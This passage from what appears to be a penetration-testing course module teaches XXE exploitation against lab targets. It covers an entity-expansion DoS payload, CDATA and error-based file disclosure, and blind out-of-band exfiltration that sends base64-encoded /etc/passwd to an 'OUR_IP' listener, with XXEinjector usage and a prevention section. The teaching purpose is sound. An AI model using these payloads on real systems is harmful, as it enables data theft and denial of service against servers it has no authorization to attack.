+  <span class="hljs-params">&lt;!ENTITY a9 "<span class="hljs-variable">&amp;a8</span>;<span class="hljs-variable">&amp;a8</span>;<span class="hljs-variable">&amp;a8</span>;<span class="hljs-variable">&amp;a8</span>;<span class="hljs-variable">&amp;a8</span>;<span class="hljs-variable">&amp;a8</span>;<span class="hljs-variable">&amp;a8</span>;<span class="hljs-variable">&amp;a8</span>;<span class="hljs-variable">&amp;a8</span>;<span class="hljs-variable">&amp;a8</span>;"&gt;</span>        
+  <span class="hljs-params">&lt;!ENTITY a10 "<span class="hljs-variable">&amp;a9</span>;<span class="hljs-variable">&amp;a9</span>;<span class="hljs-variable">&amp;a9</span>;<span class="hljs-variable">&amp;a9</span>;<span class="hljs-variable">&amp;a9</span>;<span class="hljs-variable">&amp;a9</span>;<span class="hljs-variable">&amp;a9</span>;<span class="hljs-variable">&amp;a9</span>;<span class="hljs-variable">&amp;a9</span>;<span class="hljs-variable">&amp;a9</span>;"&gt;</span>        
+]&gt;
+<span class="hljs-params">&lt;root&gt;</span>
+<span class="hljs-params">&lt;name&gt;</span><span class="hljs-params">&lt;/name&gt;</span>
+<span class="hljs-params">&lt;tel&gt;</span><span class="hljs-params">&lt;/tel&gt;</span>
+<span class="hljs-params">&lt;email&gt;</span><span class="hljs-variable">&amp;a10</span>;<span class="hljs-params">&lt;/email&gt;</span>
+<span class="hljs-params">&lt;message&gt;</span><span class="hljs-params">&lt;/message&gt;</span>
+<span class="hljs-params">&lt;/root&gt;</span>
+</code></pre>
+<p>This payload defines the <code>a0</code> entity as <code>DOS</code>, references it in <code>a1</code> multiple times, references <code>a1</code> in <code>a2</code>, and so on until the back-end server's memory runs out due to the self-reference loops. However, <code>this attack no longer works with modern web servers (e.g., Apache), as they protect against entity self-reference</code>. Try it against this exercise, and see if it works.</p>
+<h2 id="advanced-file-disclosure">Advanced File Disclosure</h2>
+<hr>
+<p>Not all XXE vulnerabilities may be straightforward to exploit, as we have seen in the previous section. Some file formats may not be readable through basic XXE, while in other cases, the web application may not output any input values in some instances, so we may try to force it through errors.</p>
+<hr>
+<h3 id="advanced-exfiltration-with-cdata">Advanced Exfiltration with CDATA</h3>
+<p>In the previous section, we saw how we could use PHP filters to encode PHP source files, such that they would not break the XML format when referenced, which (as we saw) prevented us from reading these files. But what about other types of Web Applications? We can utilize another method to extract any kind of data (including binary data) for any web application backend. To output data that does not conform to the XML format, we can wrap the content of the external file reference with a <code>CDATA</code> tag (e.g. <code>&lt;![CDATA[ FILE_CONTENT ]]&gt;</code>). This way, the XML parser would consider this part raw data, which may contain any type of data, including any special characters.</p>
+<p>One easy way to tackle this issue would be to define a <code>begin</code> internal entity with <code>&lt;![CDATA[</code>, an <code>end</code> internal entity with <code>]]&gt;</code>, and then place our external entity file in between, and it should be considered as a <code>CDATA</code> element, as follows:</p>
+<p>Code: xml</p>
+<pre><code class="lang-xml"><span class="hljs-meta">&lt;!DOCTYPE email [
+  &lt;!ENTITY begin "&lt;![CDATA["&gt;
+  &lt;!ENTITY file SYSTEM "file:///var/www/html/submitDetails.php"&gt;
+  &lt;!ENTITY end "]]&gt;</span>"&gt;
+  <span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> <span class="hljs-attr">joined</span> "&amp;<span class="hljs-attr">begin</span>;&amp;<span class="hljs-attr">file</span>;&amp;<span class="hljs-attr">end</span>;"&gt;</span>
+]&gt;
+</code></pre>
+<p>After that, if we reference the <code>&amp;joined;</code> entity, it should contain our escaped data. However, <code>this will not work, since XML prevents joining internal and external entities</code>, so we will have to find a better way to do so.</p>
+<p>To bypass this limitation, we can utilize <code>XML Parameter Entities</code>, a special type of entity that starts with a <code>%</code> character and can only be used within the DTD. What's unique about parameter entities is that if we reference them from an external source (e.g., our own server), then all of them would be considered as external and can be joined, as follows:</p>
+<p>Code: xml</p>
+<pre><code class="lang-xml">&lt;!ENTITY joined <span class="hljs-string">"%begin;%file;%end;"</span>&gt;
+</code></pre>
+<p>So, let's try to read the <code>submitDetails.php</code> file by first storing the above line in a DTD file (e.g. <code>xxe.dtd</code>), host it on our machine, and then reference it as an external entity on the target web application, as follows:</p>
+<p>Advanced File Disclosure</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ echo <span class="hljs-string">'&lt;!ENTITY joined "%begin;%file;%end;"&gt;'</span> &gt; xxe<span class="hljs-selector-class">.dtd</span>
+root@htb[/htb]$ python3 -m http<span class="hljs-selector-class">.server</span> <span class="hljs-number">8000</span>
+
+Serving HTTP on <span class="hljs-number">0.0</span>.<span class="hljs-number">0.0</span> port <span class="hljs-number">8000</span> (http:<span class="hljs-comment">//0.0.0.0:8000/) ...</span>
+</code></pre>
+<p>Now, we can reference our external entity (<code>xxe.dtd</code>) and then print the <code>&amp;joined;</code> entity we defined above, which should contain the content of the <code>submitDetails.php</code> file, as follows:</p>
+<p>Code: xml</p>
+<pre><code class="lang-xml">&lt;!DOCTYPE email [
+  <span class="xml"><span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">begin</span> "&lt;![<span class="hljs-attr">CDATA</span>["&gt;</span> <span class="hljs-comment">&lt;!-- prepend the beginning of the CDATA tag --&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">file</span> <span class="hljs-attr">SYSTEM</span> "<span class="hljs-attr">file:</span>///<span class="hljs-attr">var</span>/<span class="hljs-attr">www</span>/<span class="hljs-attr">html</span>/<span class="hljs-attr">submitDetails.php</span>"&gt;</span> <span class="hljs-comment">&lt;!-- reference external file --&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">end</span> "]]&gt;</span>"&gt; <span class="hljs-comment">&lt;!-- append the end of the CDATA tag --&gt;</span>
+  <span class="hljs-tag">&lt;<span class="hljs-name">!ENTITY</span> % <span class="hljs-attr">xxe</span> <span class="hljs-attr">SYSTEM</span> "<span class="hljs-attr">http:</span>//<span class="hljs-attr">OUR_IP:8000</span>/<span class="hljs-attr">xxe.dtd</span>"&gt;</span> <span class="hljs-comment">&lt;!-- reference our external DTD --&gt;</span>
+  %xxe;
+]&gt;
+...
+<span class="hljs-tag">&lt;<span class="hljs-name">email</span>&gt;</span>&amp;joined;<span class="hljs-tag">&lt;/<span class="hljs-name">email</span>&gt;</span> <span class="hljs-comment">&lt;!-- reference the &amp;joined; entity to print the file content --&gt;</span></span>
+</code></pre>
+<p>Once we write our <code>xxe.dtd</code> file, host it on our machine, and then add the above lines to our HTTP request to the vulnerable web application, we can finally get the content of the <code>submitDetails.php</code> file: <img src="storage\modules\134\web\_attacks\_xxe\_php\_cdata.jpg" alt="php\_cdata"></p>
+<p>As we can see, we were able to obtain the file's source code without needing to encode it to base64, which saves a lot of time when going through various files to look for secrets and passwords.</p>
+<p>Note: In some modern web servers, we may not be able to read some files (like index.php), as the web server would be preventing a DOS attack caused by file/entity self-reference (i.e., XML entity reference loop), as mentioned in the previous section.</p>
+<p>This trick can become very handy when the basic XXE method does not work or when dealing with other web development frameworks. <code>Try to use this trick to read other files</code>.</p>
+<hr>
+<h3 id="error-based-xxe">Error Based XXE</h3>
+<p>Another situation we may find ourselves in is one where the web application might not write any output, so we cannot control any of the XML input entities to write its content. In such cases, we would be <code>blind</code> to the XML output and so would not be able to retrieve the file content using our usual methods.</p>
+<p>If the web application displays runtime errors (e.g., PHP errors) and does not have proper exception handling for the XML input, then we can use this flaw to read the output of the XXE exploit. If the web application neither writes XML output nor displays any errors, we would face a completely blind situation, which we will discuss in the next section.</p>
+<p>Let's consider the exercise we have in <code>/error</code> at the end of this section, in which none of the XML input entities is displayed on the screen. Because of this, we have no entity that we can control to write the file output. First, let's try to send malformed XML data, and see if the web application displays any errors. To do so, we can delete any of the closing tags, change one of them, so it does not close (e.g. <code>&lt;roo&gt;</code> instead of <code>&lt;root&gt;</code>), or just reference a non-existing entity, as follows: <img src="storage\modules\134\web\_attacks\_xxe\_cause\_error.jpg" alt="cause\_error"></p>
+<p>We see that we did indeed cause the web application to display an error, and it also revealed the web server directory, which we can use to read the source code of other files. Now, we can exploit this flaw to exfiltrate file content. To do so, we will use a similar technique to what we used earlier. First, we will host a DTD file that contains the following payload:</p>
+<p>Code: xml</p>
+<pre><code class="lang-xml">&lt;!<span class="hljs-keyword">ENTITY</span> % <span class="hljs-keyword">file</span> SYSTEM <span class="hljs-string">"file:///etc/hosts"</span>&gt;
+&lt;!<span class="hljs-keyword">ENTITY</span> % <span class="hljs-literal">error</span> <span class="hljs-string">"&lt;!ENTITY content SYSTEM '%nonExistingEntity;/%file;'&gt;"</span>&gt;
+</code></pre>
+<p>The above payload defines the <code>file</code> parameter entity and then joins it with an entity that does not exist. In our previous exercise, we were joining three strings. In this case, <code>%nonExistingEntity;</code> does not exist, so the web application would throw an error saying that this entity does not exist, along with our joined <code>%file;</code> as part of the error. There are many other variables that can cause an error, like a bad URI or having bad characters in the referenced file.</p>
+<p>Now, we can call our external DTD script, and then reference the <code>error</code> entity, as follows:</p>
+<p>Code: xml</p>
+<pre><code class="lang-xml"><span class="xml"><span class="hljs-meta">&lt;!DOCTYPE email [ 
+  &lt;!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd"&gt;
+</span></span><span class="perl">  %remote;</span><span class="xml"><span class="hljs-meta">
+</span></span><span class="perl">  %error;</span><span class="xml"><span class="hljs-meta">
+]&gt;</span></span>
+</code></pre>
+<p>Once we host our DTD script as we did earlier and send the above payload as our XML data (no need to include any other XML data), we will get the content of the <code>/etc/hosts</code> file as follows: <img src="storage\modules\134\web\_attacks\_xxe\_exfil\_error\_2.jpg" alt="exfil\_error"></p>
+<p>This method may also be used to read the source code of files. All we have to do is change the file name in our DTD script to point to the file we want to read (e.g. <code>"file:///var/www/html/submitDetails.php"</code>). However, <code>this method is not as reliable as the previous method for reading source files</code>, as it may have length limitations, and certain special characters may still break it.</p>
+<p>\</p>
+<h2 id="blind-data-exfiltration">Blind Data Exfiltration</h2>
+<hr>
+<p>In the previous section, we saw an example of a blind XXE vulnerability, where we did not receive any output containing any of our XML input entities. As the web server was displaying PHP runtime errors, we could use this flaw to read the content of files from the displayed errors. In this section, we will see how we can get the content of files in a completely blind situation, where we neither get the output of any of the XML entities nor do we get any PHP errors displayed.</p>
+<hr>
+<h3 id="out-of-band-data-exfiltration">Out-of-band Data Exfiltration</h3>
+<p>If we try to repeat any of the methods with the exercise we find at <code>/blind</code>, we will quickly notice that none of them seem to work, as we have no way to have anything printed on the web application response. For such cases, we can utilize a method known as <code>Out-of-band (OOB) Data Exfiltration</code>, which is often used in similar blind cases with many web attacks, like blind SQL injections, blind command injections, blind XSS, and of course, blind XXE. Both the <a href="https://academy.hackthebox.com/course/preview/cross-site-scripting-xss">Cross-Site Scripting (XSS)</a> and the <a href="https://academy.hackthebox.com/course/preview/whitebox-pentesting-101-command-injection">Whitebox Pentesting 101: Command Injections</a> modules discussed similar attacks, and here we will utilize a similar attack, with slight modifications to fit our XXE vulnerability.</p>
+<p>In our previous attacks, we utilized an <code>out-of-band</code> attack since we hosted the DTD file in our machine and made the web application connect to us (hence out-of-band). So, our attack this time will be pretty similar, with one significant difference. Instead of having the web application output our <code>file</code> entity to a specific XML entity, we will make the web application send a web request to our web server with the content of the file we are reading.</p>
+<p>To do so, we can first use a parameter entity for the content of the file we are reading while utilizing PHP filter to base64 encode it. Then, we will create another external parameter entity and reference it to our IP, and place the <code>file</code> parameter value as part of the URL being requested over HTTP, as follows:</p>
+<p>Code: xml</p>
+<pre><code class="lang-xml">&lt;!<span class="hljs-keyword">ENTITY</span> % <span class="hljs-keyword">file</span> SYSTEM <span class="hljs-string">"php://filter/convert.base64-encode/resource=/etc/passwd"</span>&gt;
+&lt;!<span class="hljs-keyword">ENTITY</span> % oob <span class="hljs-string">"&lt;!ENTITY content SYSTEM 'http://OUR_IP:8000/?content=%file;'&gt;"</span>&gt;
+</code></pre>
+<p>If, for example, the file we want to read had the content of <code>XXE_SAMPLE_DATA</code>, then the <code>file</code> parameter would hold its base64 encoded data (<code>WFhFX1NBTVBMRV9EQVRB</code>). When the XML tries to reference the external <code>oob</code> parameter from our machine, it will request <code>http://OUR_IP:8000/?content=WFhFX1NBTVBMRV9EQVRB</code>. Finally, we can decode the <code>WFhFX1NBTVBMRV9EQVRB</code> string to get the content of the file. We can even write a simple PHP script that automatically detects the encoded file content, decodes it, and outputs it to the terminal:</p>
+<p>Code: php</p>
+<pre><code class="lang-php"><span class="php"><span class="hljs-meta">&lt;?php</span>
+<span class="hljs-keyword">if</span>(<span class="hljs-keyword">isset</span>($_GET[<span class="hljs-string">'content'</span>])){
+    error_log(<span class="hljs-string">"\n\n"</span> . base64_decode($_GET[<span class="hljs-string">'content'</span>]));
+}
+<span class="hljs-meta">?&gt;</span></span>
+</code></pre>
+<p>So, we will first write the above PHP code to <code>index.php</code>, and then start a PHP server on port <code>8000</code>, as follows:</p>
+<p>Blind Data Exfiltration</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ vi index.php # here we write the above PHP code
+root@htb[/htb]$ php -S <span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>:<span class="hljs-number">8000</span>
+
+PHP <span class="hljs-number">7.4</span><span class="hljs-meta">.3</span> Development Server (http://<span class="hljs-number">0.0</span><span class="hljs-meta">.0</span><span class="hljs-meta">.0</span>:<span class="hljs-number">8000</span>) started
+</code></pre>
+<p>Now, to initiate our attack, we can use a similar payload to the one we used in the error-based attack, and simply add <code>&lt;root&gt;&amp;content;&lt;/root&gt;</code>, which is needed to reference our entity and have it send the request to our machine with the file content:</p>
+<p>Code: xml</p>
+<pre><code class="lang-xml"><span class="xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span>
+<span class="hljs-meta">&lt;!DOCTYPE email [ 
+  &lt;!ENTITY % remote SYSTEM "http://OUR_IP:8000/xxe.dtd"&gt;
+</span></span><span class="perl">  %remote;</span><span class="xml"><span class="hljs-meta">
+</span></span><span class="perl">  %oob;</span><span class="xml"><span class="hljs-meta">
+]&gt;</span>
+<span class="hljs-tag">&lt;<span class="hljs-name">root</span>&gt;</span>&amp;content;<span class="hljs-tag">&lt;/<span class="hljs-name">root</span>&gt;</span></span>
+</code></pre>
+<p>Then, we can send our request to the web application: <img src="storage\modules\134\web\_attacks\_xxe\_blind\_request.jpg" alt="blind\_request"></p>
+<p>Finally, we can go back to our terminal, and we will see that we did indeed get the request and its decoded content:</p>
+<p>Blind Data Exfiltration</p>
+<pre><code class="lang-shell-session">PHP <span class="hljs-number">7.4</span><span class="hljs-number">.3</span> Development Server (<span class="hljs-string">http:</span><span class="hljs-comment">//0.0.0.0:8000) started</span>
+<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.16</span>:<span class="hljs-number">46256</span> Accepted
+<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.16</span>:<span class="hljs-number">46256</span> [<span class="hljs-number">200</span>]: (<span class="hljs-literal">null</span>) /xxe.dtd
+<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.16</span>:<span class="hljs-number">46256</span> Closing
+<span class="hljs-number">10.10</span><span class="hljs-number">.14</span><span class="hljs-number">.16</span>:<span class="hljs-number">46258</span> Accepted
+<span class="hljs-symbol">
+root:</span><span class="hljs-string">x:</span><span class="hljs-number">0</span>:<span class="hljs-number">0</span>:<span class="hljs-string">root:</span><span class="hljs-regexp">/root:/</span>bin/bash
+<span class="hljs-string">daemon:</span><span class="hljs-string">x:</span><span class="hljs-number">1</span>:<span class="hljs-number">1</span>:<span class="hljs-string">daemon:</span><span class="hljs-regexp">/usr/</span><span class="hljs-string">sbin:</span><span class="hljs-regexp">/usr/</span>sbin/nologin
+<span class="hljs-string">bin:</span><span class="hljs-string">x:</span><span class="hljs-number">2</span>:<span class="hljs-number">2</span>:<span class="hljs-string">bin:</span><span class="hljs-regexp">/bin:/</span>usr<span class="hljs-regexp">/sbin/</span>nologin
+...SNIP...
+</code></pre>
+<p>Tip: In addition to storing our base64 encoded data as a parameter to our URL, we may utilize <code>DNS OOB Exfiltration</code> by placing the encoded data as a sub-domain for our URL (e.g. <code>ENCODEDTEXT.our.website.com</code>), and then use a tool like <code>tcpdump</code> to capture any incoming traffic and decode the sub-domain string to get the data. Granted, this method is more advanced and requires more effort to exfiltrate data through.</p>
+<hr>
+<h3 id="automated-oob-exfiltration">Automated OOB Exfiltration</h3>
+<p>Although in some instances we may have to use the manual method we learned above, in many other cases, we can automate the process of blind XXE data exfiltration with tools. One such tool is <a href="https://github.com/enjoiz/XXEinjector">XXEinjector</a>. This tool supports most of the tricks we learned in this module, including basic XXE, CDATA source exfiltration, error-based XXE, and blind OOB XXE.</p>
+<p>To use this tool for automated OOB exfiltration, we can first clone the tool to our machine, as follows:</p>
+<p>Blind Data Exfiltration</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ git clone https:<span class="hljs-comment">//github.com/enjoiz/XXEinjector.git</span>
+
+Cloning into <span class="hljs-string">'XXEinjector'</span>...
+...SNIP...
+</code></pre>
+<p>Once we have the tool, we can copy the HTTP request from Burp and write it to a file for the tool to use. We should not include the full XML data, only the first line, and write <code>XXEINJECT</code> after it as a position locator for the tool:</p>
+<p>Code: http</p>
+<pre><code class="lang-http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/blind/submitDetails.php</span> HTTP/1.1
+<span class="hljs-attribute">Host</span>: 10.129.201.94
+<span class="hljs-attribute">Content-Length</span>: 169
+<span class="hljs-attribute">User-Agent</span>: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko)
+<span class="hljs-attribute">Content-Type</span>: text/plain;charset=UTF-8
+<span class="hljs-attribute">Accept</span>: */*
+<span class="hljs-attribute">Origin</span>: http://10.129.201.94
+<span class="hljs-attribute">Referer</span>: http://10.129.201.94/blind/
+<span class="hljs-attribute">Accept-Encoding</span>: gzip, deflate
+<span class="hljs-attribute">Accept-Language</span>: en-US,en;q=0.9
+<span class="hljs-attribute">Connection</span>: close
+
+<span class="xml"><span class="php"><span class="hljs-meta">&lt;?</span>xml version=<span class="hljs-string">"1.0"</span> encoding=<span class="hljs-string">"UTF-8"</span><span class="hljs-meta">?&gt;</span></span>
+XXEINJECT</span>
+</code></pre>
+<p>Now, we can run the tool with the <code>--host</code>/<code>--httpport</code> flags being our IP and port, the <code>--file</code> flag being the file we wrote above, and the <code>--path</code> flag being the file we want to read. We will also select the <code>--oob=http</code> and <code>--phpfilter</code> flags to repeat the OOB attack we did above, as follows:</p>
+<p>Blind Data Exfiltration</p>
+<pre><code class="lang-shell-session">root@htb[/htb]$ ruby XXEinjector.rb <span class="hljs-attr">--host=[tun0</span> IP] <span class="hljs-attr">--httpport=8000</span> <span class="hljs-attr">--file=/tmp/xxe.req</span> <span class="hljs-attr">--path=/etc/passwd</span> <span class="hljs-attr">--oob=http</span> --phpfilter
+
+...SNIP...
+[+] Sending request <span class="hljs-keyword">with</span> malicious XML.
+[+] Responding <span class="hljs-keyword">with</span> XML for: /etc/passwd
+[+] Retrieved data:
+</code></pre>
+<p>We see that the tool did not directly print the data. This is because we are base64 encoding the data, so it does not get printed. In any case, all exfiltrated files get stored in the <code>Logs</code> folder under the tool, and we can find our file there:</p>
+<pre><code class="lang-shell-session">root<span class="hljs-variable">@htb</span>[<span class="hljs-regexp">/htb]$ cat Logs/</span><span class="hljs-number">10.129</span>.<span class="hljs-number">201.94</span>/etc/passwd.log 
+
+<span class="hljs-symbol">root:</span><span class="hljs-symbol">x:</span><span class="hljs-number">0</span><span class="hljs-symbol">:</span><span class="hljs-number">0</span><span class="hljs-symbol">:root</span><span class="hljs-symbol">:/root</span><span class="hljs-symbol">:/bin/bash</span>
+<span class="hljs-symbol">daemon:</span><span class="hljs-symbol">x:</span><span class="hljs-number">1</span><span class="hljs-symbol">:</span><span class="hljs-number">1</span><span class="hljs-symbol">:daemon</span><span class="hljs-symbol">:/usr/sbin</span><span class="hljs-symbol">:/usr/sbin/nologin</span>
+...SNIP..
+</code></pre>
+<p>Try to use the tool to repeat other XXE methods we learned.</p>
+<h2 id="xxe-prevention">XXE Prevention</h2>
+<hr>
+<p>We have seen that XXE vulnerabilities mainly occur when an unsafe XML input references an external entity, which is eventually exploited to read sensitive files and perform other actions. Preventing XXE vulnerabilities is relatively easier than preventing other web vulnerabilities, as they are caused mainly by outdated XML libraries.</p>
+<hr>
+<h3 id="avoiding-outdated-components">Avoiding Outdated Components</h3>
+<p>While other input validation web vulnerabilities are usually prevented through secure coding practices (e.g., XSS, IDOR, SQLi, OS Injection), this is not entirely necessary to prevent XXE vulnerabilities. This is because XML input is usually not handled manually by the web developers but by the built-in XML libraries instead. So, if a web application is vulnerable to XXE, this is very likely due to an outdated XML library that parses the XML data.</p>
+<p>For example, PHP's <a href="https://www.php.net/manual/en/function.libxml-disable-entity-loader.php">libxml_disable_entity_loader</a> function is deprecated since it allows a developer to enable external entities in an unsafe manner, which leads to XXE vulnerabilities. If we visit PHP's documentation for this function, we see the following warning:</p>
+<p><strong>Warning</strong></p>
+<p>This function has been <em>DEPRECATED</em> as of PHP 8.0.0. Relying on this function is highly discouraged.</p>
+<p>Furthermore, even common code editors (e.g., VSCode) will highlight that this specific function is deprecated and will warn us against using it: <img src="storage\modules\134\web\_attacks\_xxe\_deprecated\_warning.jpg" alt="deprecated\_warning"></p>
+<p>Note: You can find a detailed report of all vulnerable XML libraries, with recommendations on updating them and using safe functions, in <a href="https://cheatsheetseries.owasp.org/cheatsheets/XML\_External\_Entity\_Prevention\_Cheat\_Sheet.html#php">OWASP's XXE Prevention Cheat Sheet</a>.</p>
+<p>In addition to updating the XML libraries, we should also update any components that parse XML input, such as API libraries like SOAP. Furthermore, any document or file processors that may perform XML parsing, like SVG image processors or PDF document processors, may also be vulnerable to XXE vulnerabilities, and we should update them as well.</p>
+<p>These issues are not exclusive to XML libraries only, as the same applies to all other web components (e.g., outdated <code>Node Modules</code>). In addition to common package managers (e.g. <code>npm</code>), common code editors will notify web developers of the use of outdated components and suggest other alternatives. In the end, <code>using the latest XML libraries and web development components can greatly help reduce various web vulnerabilities</code>, including XXE.</p>
+<hr>
+<h3 id="using-safe-xml-configurations">Using Safe XML Configurations</h3>
+<p>Other than using the latest XML libraries, certain XML configurations for web applications can help reduce the possibility of XXE exploitation. These include:</p>
+<ul>
+<li>Disable referencing custom <code>Document Type Definitions (DTDs)</code></li>
+<li>Disable referencing <code>External XML Entities</code></li>
+<li>Disable <code>Parameter Entity</code> processing</li>
+<li>Disable support for <code>XInclude</code></li>
+<li>Prevent <code>Entity Reference Loops</code></li>
+</ul>
+<p>Another thing we saw was Error-based XXE exploitation. So, we should always have proper exception handling in our web applications and <code>should always disable displaying runtime errors in web servers</code>.</p>
+<p>Such configurations should be another layer of protection if we miss updating some XML libraries and should also prevent XXE exploitation. However, we may still be using vulnerable libraries in such cases and only applying workarounds against exploitation, which is not ideal.</p>
+<p>With the various issues and vulnerabilities introduced by XML data, many also recommend <code>using other formats, such as JSON or YAML</code>. This also includes avoiding API standards that rely on XML (e.g., SOAP) and using JSON-based APIs instead (e.g., REST).</p>
+<p>Finally, using Web Application Firewalls (WAFs) is another layer of protection against XXE exploitation. However, we should never entirely rely on WAFs and leave the back-end vulnerable, as WAFs can always be bypassed.</p>
+</div></body></html>
